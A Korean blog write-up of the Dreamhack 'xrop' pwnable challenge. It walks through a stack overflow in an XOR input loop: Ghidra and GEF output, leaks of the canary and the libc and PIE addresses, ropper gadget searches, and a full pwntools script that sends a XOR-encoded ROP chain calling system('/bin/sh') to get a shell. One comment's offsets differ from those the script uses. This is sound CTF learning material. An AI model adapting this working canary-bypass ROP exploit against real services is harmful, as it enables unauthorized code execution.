---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN xrop"
excerpt: "드림핵 포너블 xrop 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2025-08-10 16:00
---

Pwn2Own 2025 Ireland가 시작하며 다시 ROP 감을 찾고자 xrop 문제를 풀어봤다.

해당 문제는 입력 받은 값이 xor 되어 스택에 저장되는 문제로 걸려있는 보호 기법은 다음과 같다.

```bash
╰─○ checksec --file=./prob
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   43 Symbols        No     0               2               ./prob
```

심볼 제거, FORTIFY  빼고는 앵간한 보호 기법이 다 걸려있다. 우선 문제 바이너리를 ghidra로 열어보자.

```cpp
undefined8 main(void)

{
  ssize_t sVar1;
  char *pcVar2;
  long in_FS_OFFSET;
  int local_30;
  byte local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  do {
    printf("Input: ");
    sVar1 = read(0,local_28,0x100);
    for (local_30 = 1; local_30 < (int)sVar1; local_30 = local_30 + 1) {
      local_28[local_30 + -1] = local_28[local_30] ^ local_28[local_30 + -1];
    }
    printf("You entered: %s\n",local_28);
    pcVar2 = strtok((char *)local_28,"exit");
  } while (pcVar2 != (char *)0x0);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

다른 추가적인 함수 Call 없이 main에서 문제의 역할을 전부 수행한다.

do while 구문에서 read를 통해 입력 받는 배열의 크기는 24이지만 입력 값의 길이 제한 검증이 미흡하여 BoF가 발생한다. 이후 for문의 XOR 기능을 통해 입력한 값을 1바이트 씩 다음 1바이트와 계산하는 로직을 구현했으며, read 함수를 통해 입력한 길이 -1만큼 동작해 결과적으로 입력한 값들을 XOR 하는 코드 부분이다. 이후 printf를 통해 XOR하여 저장된 값을 확인해주고 XOR 된 값을 토큰화 하여 e, x, i, t 중 하나라도 있거나 널 바이트가 있으면 카나리 값 검사 후 return하는 코드다.

코드를 보면 익스 방법이 명확하다. 먼저 카나리 값을 릭하고 다음 필요에 따라 PIE base addr와 libc base addr를 릭해 ROP 가젯 체이닝을 하면 될 것이다.

read함수 다음에 bp를 걸어 값 입력 후 스택을 확인하자. 

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x9               
$rbx   : 0x0               
$rcx   : 0x000074f174f45992  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x100             
$rsp   : 0x00007ffcf7795820  →  0x0000000000000002
$rbp   : 0x00007ffcf7795850  →  0x0000000000000001
$rsi   : 0x00007ffcf7795830  →  "asdfasdf\n"
$rdi   : 0x0               
$rip   : 0x0000600d264ee268  →  <main+009f> mov DWORD PTR [rbp-0x24], eax
$r8    : 0x7               
$r9    : 0x000074f175069040  →   endbr64 
$r10   : 0x0000600d264ef004  →  0x00203a7475706e49 ("Input: "?)
$r11   : 0x246             
$r12   : 0x00007ffcf7795968  →  0x00007ffcf7797969  →  0x534f4800626f7270 ("prob"?)
$r13   : 0x0000600d264ee1c9  →  <main+0000> endbr64 
$r14   : 0x0000600d264f0da0  →  0x0000600d264ee180  →  <__do_global_dtors_aux+0000> endbr64 
$r15   : 0x000074f17509d040  →  0x000074f17509e2e0  →  0x0000600d264ed000  →  0x00010102464c457f
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcf7795820│+0x0000: 0x0000000000000002   ← $rsp
0x00007ffcf7795828│+0x0008: 0x00000000178bfbff
0x00007ffcf7795830│+0x0010: "asdfasdf\n"         ← $rsi
0x00007ffcf7795838│+0x0018: 0x000000000000000a ("\n"?)
0x00007ffcf7795840│+0x0020: 0x0000000000001000
0x00007ffcf7795848│+0x0028: 0xba38f45ff9545200
0x00007ffcf7795850│+0x0030: 0x0000000000000001   ← $rbp
0x00007ffcf7795858│+0x0038: 0x000074f174e5ad90  →   mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x600d264ee25b <main+0092>      mov    rsi, rax
   0x600d264ee25e <main+0095>      mov    edi, 0x0
   0x600d264ee263 <main+009a>      call   0x600d264ee0b0 <read@plt>
●→ 0x600d264ee268 <main+009f>      mov    DWORD PTR [rbp-0x24], eax
   0x600d264ee26b <main+00a2>      mov    DWORD PTR [rbp-0x28], 0x1
   0x600d264ee272 <main+00a9>      jmp    0x600d264ee29d <main+212>
   0x600d264ee274 <main+00ab>      mov    eax, DWORD PTR [rbp-0x28]
   0x600d264ee277 <main+00ae>      sub    eax, 0x1
   0x600d264ee27a <main+00b1>      cdqe   
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "prob", stopped 0x600d264ee268 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x600d264ee268 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
(remote) gef➤  x/32gx 0x00007ffcf7795830
0x7ffcf7795830: 0x6664736166647361      0x000000000000000a
0x7ffcf7795840: 0x0000000000001000      0xba38f45ff9545200
0x7ffcf7795850: 0x0000000000000001      0x000074f174e5ad90
0x7ffcf7795860: 0x0000000000000000      0x0000600d264ee1c9
0x7ffcf7795870: 0x00000001f7795950      0x00007ffcf7795968
0x7ffcf7795880: 0x0000000000000000      0xd879fe562e1a307f
0x7ffcf7795890: 0x00007ffcf7795968      0x0000600d264ee1c9
0x7ffcf77958a0: 0x0000600d264f0da0      0x000074f17509d040
0x7ffcf77958b0: 0x278010a49ed8307f      0x319b179d7490307f
0x7ffcf77958c0: 0x000074f100000000      0x0000000000000000
0x7ffcf77958d0: 0x0000000000000000      0x0000000000000000
0x7ffcf77958e0: 0x0000000000000000      0xba38f45ff9545200
0x7ffcf77958f0: 0x0000000000000000      0x000074f174e5ae40
0x7ffcf7795900: 0x00007ffcf7795978      0x0000600d264f0da0
0x7ffcf7795910: 0x000074f17509e2e0      0x0000000000000000
0x7ffcf7795920: 0x0000000000000000      0x0000600d264ee0e0
```

0x7ffcf7795830 지점에 입력한 asdfasdf가 저장되었고 0x7ffcf7795848 지점에 카나리 값, 0x7ffcf7795858 지점에 libc의 return 주소, 0x7ffcf7795868 지점에서 PIE 주소를 Leak 할 수 있다.

특정 값이 입력되기 전까지는 BoF가 발생해도 return이 호출되지 않아 카나리 값 검사를 진행하지 않는다. 따라서 카나리, libc base, PIE base를 순서대로 구해준다.

먼저 asdfasdf * 3번 입력하고 마지막 엔터인 \x0a까지 전달되면 출력되는 값의 마지막 7바이트는 XOR 처리 되지 않는 카나리 값을 얻을 수 있다. 이후 동일하게 libc 주소를 Leak한다. 아래 gdb를 보면 Leak된 libc 주소는 r권한 기준 베이스 주소와 0x29d90 만큼의 offset을 가지고, Leak된 PIE 주소는 x 권한 기준 base 주소와 0x1c9 만큼의 offset을 가지고 있다.

```bash
(remote) gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000600d264ed000 0x0000600d264ee000 0x0000000000000000 r-- /home/pwn/prob
0x0000600d264ee000 0x0000600d264ef000 0x0000000000001000 r-x /home/pwn/prob
0x0000600d264ef000 0x0000600d264f0000 0x0000000000002000 r-- /home/pwn/prob
0x0000600d264f0000 0x0000600d264f1000 0x0000000000002000 r-- /home/pwn/prob
0x0000600d264f1000 0x0000600d264f2000 0x0000000000003000 rw- /home/pwn/prob
0x000074f174e2e000 0x000074f174e31000 0x0000000000000000 rw- 
0x000074f174e31000 0x000074f174e59000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x000074f174e59000 0x000074f174fee000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x000074f174fee000 0x000074f175046000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x000074f175046000 0x000074f17504a000 0x0000000000214000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x000074f17504a000 0x000074f17504c000 0x0000000000218000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x000074f17504c000 0x000074f175059000 0x0000000000000000 rw- 
0x000074f17505b000 0x000074f17505d000 0x0000000000000000 rw- 
0x000074f17505d000 0x000074f17505f000 0x0000000000000000 r-- [vvar]
0x000074f17505f000 0x000074f175061000 0x0000000000000000 r-- [vvar_vclock]
0x000074f175061000 0x000074f175063000 0x0000000000000000 r-x [vdso]
0x000074f175063000 0x000074f175065000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x000074f175065000 0x000074f17508f000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x000074f17508f000 0x000074f17509a000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x000074f17509b000 0x000074f17509d000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x000074f17509d000 0x000074f17509f000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffcf7777000 0x00007ffcf7798000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

(remote) gef➤  p 0x000074f174e5ad90-0x000074f174e31000
$1 = 0x29d90
(remote) gef➤  p 0x0000600d264ee1c9-0x0000600d264ee000
$2 = 0x1c9
```

이후 ROP를 위한 가젯을 찾아야 한다. 가장 깔끔한 방법은 pop rdi ; ret 과 /bin/sh 문자열 주소를 찾아 한번에 처리하는 것이다. prob 바이너리와 문제 도커 내부에 존재하는 libc를 분석해 pop rdi ; ret 가젯과  /bin/sh를 찾아보자.

```bash
(remote) gef➤  !ropper --file ./prob --search "pop rdi; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

(remote) gef➤  !ropper --file ../libc.so.6 --search "pop rdi; ret;" | tail -n 6
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;
[INFO] File: ../libc.so.6

0x000000000002a3e5: pop rdi; ret; 

(remote) gef➤  !ropper --file ./prob --string "/bin/sh"

Strings
=======

Address  Value  
-------  -----  

(remote) gef➤  !ropper --file ../libc.so.6 --string "/bin/sh"

Strings
=======

Address     Value    
-------     -----    
0x001d8698  /bin/sh

(remote) gef➤  p &system
$6 = (<text variable, no debug info> *) 0x74f174e81d60 <system>
(remote) gef➤  p 0x74f174e81d60 - 0x000074f174e31000
$7 = 0x50d60
```

위 결과를 보니 PIE base주소는 굳이 필요 없어 보인다. system 함수는 libc의 +0x50d60, pop rdi; ret; 가젯은 libc의 +0x2a3e5, /bin/sh 문자열은 libc의 +0x1d8698  위치에 있다.

이제 필요한 가젯들의 실제 주소를 구해 우리가 구한 offset이 정확한지 확인하자.

```bash
(remote) gef➤  x/2i 0x000074f174e31000 + 0x2a3e5
   0x74f174e5b3e5 <iconv+197>:  pop    rdi
   0x74f174e5b3e6 <iconv+198>:  ret

(remote) gef➤  disass 0x000074f174e31000 + 0x50d60
Dump of assembler code for function system:
   0x000074f174e81d60 <+0>:     endbr64
   0x000074f174e81d64 <+4>:     test   rdi,rdi
   0x000074f174e81d67 <+7>:     je     0x74f174e81d70 <system+16>
   0x000074f174e81d69 <+9>:     jmp    0x74f174e818f0
   0x000074f174e81d6e <+14>:    xchg   ax,ax
   0x000074f174e81d70 <+16>:    sub    rsp,0x8
   0x000074f174e81d74 <+20>:    lea    rdi,[rip+0x187925]        # 0x74f1750096a0
   0x000074f174e81d7b <+27>:    call   0x74f174e818f0
   0x000074f174e81d80 <+32>:    test   eax,eax
   0x000074f174e81d82 <+34>:    sete   al
   0x000074f174e81d85 <+37>:    add    rsp,0x8
   0x000074f174e81d89 <+41>:    movzx  eax,al
   0x000074f174e81d8c <+44>:    ret
   
(remote) gef➤  x/s 0x000074f174e31000 + 0x001d8698
0x74f175009698: "/bin/sh"

```

확인 결과 이상 없는 것 같다.

더미 24바이트 + 카나리 + 더미2 8바이트 + “pop rdi; ret; 가젯 주소” + “/bin/sh 주소” + system 함수 주소 를 xor 항등원 성질을 이용해 역 연산 해 read함수에 입력하면 된다. 필자는 가젯으로 인해 스택 구조가 망가지는 것을 막기 위해 pop rdi; ret;을 호출하기 전 ret;을 한번 더 호출했다.

아래는 위 익스 방법을 구현한 파이썬 코드다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
# ontext.log_level = 'debug'

# p = process(['qemu-aarch64-static','-L', '/usr/arm-linux-gnueabi', '-g', '8888', './app'])
# p = process(['qemu-aarch64-static', '-g', '1111', './deploy/prob'])
p = remote("172.17.0.2", 8080)
# elf = ELF("./deploy/prob")

def make_xored_input(desired_bytes):
    N = len(desired_bytes)
    buf = [0] * N
    buf[N-1] = desired_bytes[N-1]
    for i in range(N-1, 0, -1):
        buf[i-1] = desired_bytes[i-1] ^ buf[i]
    #print(buf)
    return bytes(buf)

bof = b"abcd"*6

p.sendlineafter(b"Input: ", bof)

p.recvuntil(b"You entered: ")
p.recv(len(bof)+1)

canary = b"\x00"+p.recv(7)
print(f"Leak canary : {hex(u64(canary))}")

get_libc_base_dummy = b"asdf"*10

p.sendafter(b"Input: ", get_libc_base_dummy)
p.recvuntil(b"You entered: ")

p.recv(len(get_libc_base_dummy))

libc_leak = u64(p.recv(6)+b"\x00\x00")
print(f"Leak libc : {hex(libc_leak)}")
libc_base = libc_leak-0x29d90
print(f"libc base : {hex(libc_base)}")

get_pie_base_dummy = b"qwer"*14

p.sendafter(b"Input: ", get_pie_base_dummy)
p.recvuntil(b"You entered: ")

p.recv(len(get_pie_base_dummy))

PIE_leak = u64(p.recv(6)+b"\x00\x00")
print(f"Leak PIE : {hex(PIE_leak)}")
PIE_base = PIE_leak-0x1c9
print(f"PIE base : {hex(PIE_base)}")

## 0x000000000002a3e5: pop rdi; ret; libc 가젯
## libc_base+0x1b0698  /bin/sh
## libc+0x28d60 system()

pr = libc_base+0x2a3e5
ret = libc_base+0xf41c9
binsh = libc_base+0x1d8698
system = libc_base+0x50d60

payload = b"\x00"+b"a"*23
payload +=  canary
payload += b"qwerqwer"
payload += p64(ret)
payload += p64(pr)
payload += p64(binsh)
payload += p64(system)

p.sendafter(b"Input: ", make_xored_input(payload))
p.interactive()

```